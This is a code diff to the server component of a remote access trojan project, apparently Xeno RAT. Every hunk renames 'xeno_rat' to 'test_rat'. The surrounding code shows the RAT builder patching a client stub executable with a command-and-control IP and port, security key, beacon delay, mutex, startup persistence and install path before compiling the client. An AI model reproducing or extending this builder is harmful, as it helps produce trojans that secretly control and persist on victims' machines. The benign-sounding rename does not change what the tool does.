@@ -24,14 +24,14 @@ using System.Drawing.Imaging;
 using Newtonsoft.Json;
 using System.Reflection.Emit;
 using Newtonsoft.Json.Linq;
-using xeno_rat_server.Forms;
+using test_rat_server.Forms;
 using System.IO.Compression;
 using System.Net;
 using System.ComponentModel.Composition;
 using MaxMind.GeoIP2;
 using MaxMind.GeoIP2.Responses;
 
-namespace xeno_rat_server
+namespace test_rat_server
 {
     public partial class MainForm : Form
     {
@@ -1490,7 +1490,7 @@ namespace xeno_rat_server
         }
         public static void SetsecurityKey(ModuleDefMD module, byte[] securityKey)
         {
-            string typeName = "xeno_rat_client.Program";
+            string typeName = "test_rat_client.Program";
             string methodName = ".cctor";
             int instructionIndex = 9;
             TypeDef type = module.Find(typeName, isReflectionName: true);
@@ -1504,7 +1504,7 @@ namespace xeno_rat_server
         }
         public static void SetServerIp(ModuleDefMD module, string ip)
         {
-            string typeName = "xeno_rat_client.Program";
+            string typeName = "test_rat_client.Program";
             string methodName = ".cctor";
             int instructionIndex = 2;
             TypeDef type = module.Find(typeName, isReflectionName: true);
@@ -1517,7 +1517,7 @@ namespace xeno_rat_server
         }
         public static void SetServerPort(ModuleDefMD module, int port)
         {
-            string typeName = "xeno_rat_client.Program";
+            string typeName = "test_rat_client.Program";
             string methodName = ".cctor";
             int instructionIndex = 4;
             TypeDef type = module.Find(typeName, isReflectionName: true);
@@ -1530,7 +1530,7 @@ namespace xeno_rat_server
         }
         public static void SetDelay(ModuleDefMD module, int delay)
         {
-            string typeName = "xeno_rat_client.Program";
+            string typeName = "test_rat_client.Program";
             string methodName = ".cctor";
             int instructionIndex = 12;
             TypeDef type = module.Find(typeName, isReflectionName: true);
@@ -1543,7 +1543,7 @@ namespace xeno_rat_server
         }
         public static void SetMutex(ModuleDefMD module, string mutex)
         {
-            string typeName = "xeno_rat_client.Program";
+            string typeName = "test_rat_client.Program";
             string methodName = ".cctor";
             int instructionIndex = 14;
             TypeDef type = module.Find(typeName, isReflectionName: true);
@@ -1557,7 +1557,7 @@ namespace xeno_rat_server
         public static void SetStartup(ModuleDefMD module, bool dostartup)
         {
             if (!dostartup) return;
-            string typeName = "xeno_rat_client.Program";
+            string typeName = "test_rat_client.Program";
             string methodName = ".cctor";
             int instructionIndex = 16;
             TypeDef type = module.Find(typeName, isReflectionName: true);
@@ -1570,7 +1570,7 @@ namespace xeno_rat_server
         }
         public static void SetInstallenv(ModuleDefMD module, string env)
         {
-            string typeName = "xeno_rat_client.Program";
+            string typeName = "test_rat_client.Program";
             string methodName = ".cctor";
             int instructionIndex = 18;
             TypeDef type = module.Find(typeName, isReflectionName: true);
@@ -1583,7 +1583,7 @@ namespace xeno_rat_server
         }
         public static void SetStartupName(ModuleDefMD module, string name)
         {
-            string typeName = "xeno_rat_client.Program";
+            string typeName = "test_rat_client.Program";
             string methodName = ".cctor";
             int instructionIndex = 20;
             TypeDef type = module.Find(typeName, isReflectionName: true);
@@ -1613,7 +1613,7 @@ namespace xeno_rat_server
                 }
                 AddLog("Building client...", Color.Blue);
                 string filePath = saveFileDialog.FileName;
-                ModuleDefMD module = ModuleDefMD.Load("stub\\xeno rat client.exe");
+                ModuleDefMD module = ModuleDefMD.Load("stub\\test rat client.exe");
                 SetsecurityKey(module, Utils.CalculateSha256Bytes(textBox14.Text));
                 SetServerIp(module, textBox12.Text);
                 SetServerPort(module, int.Parse(textBox13.Text));
